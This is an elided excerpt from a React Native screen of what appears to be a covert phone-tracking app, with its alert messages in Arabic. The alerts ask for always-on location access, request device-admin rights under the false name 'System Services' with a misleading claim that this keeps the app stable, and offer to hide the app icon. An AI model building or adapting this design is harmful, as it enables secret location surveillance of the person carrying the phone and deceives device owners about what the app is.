...
const MainScreen = ({ navigation, route }) => {
      ...
      const initTracking = async () => {
        try {
          ...
          if (hasPermission) {
            ...
            Alert.alert(
              'تفعيل الخدمة',
              'الخدمة معطّلة. الرجاء تفعيل خدمة الموقع من إعدادات الجوال > التطبيقات > الأذونات > الموقع > السماح طول الوقت',
              [{ text: 'حسناً' }]
            );
          }
        } catch (error) {
  ...
  const checkDeviceAdmin = async () => {
    ...
    try {
      ...
      if (!isActive) {
        Alert.alert(
          '⚙️ تفعيل خدمات النظام',
          'لاستمرار عمل التطبيق بشكل صحيح، الرجاء تفعيل "خدمات النظام" في الشاشة التالية.\n\nهذي الخدمة تحافظ على استقرار التطبيق وتمنع إيقافه بالغلط.',
          [
  ...
  const handleHideIcon = () => {
    ...
    Alert.alert(
      '👻 إخفاء الأيقونة',
      'بعد الإخفاء، الأيقونة ما راح تظهر على شاشة الجوال.\n\n⚠️ مهم: لإعادة الفتح، روح:\nالإعدادات > التطبيقات > "خدمات النظام" > فتح',
      [
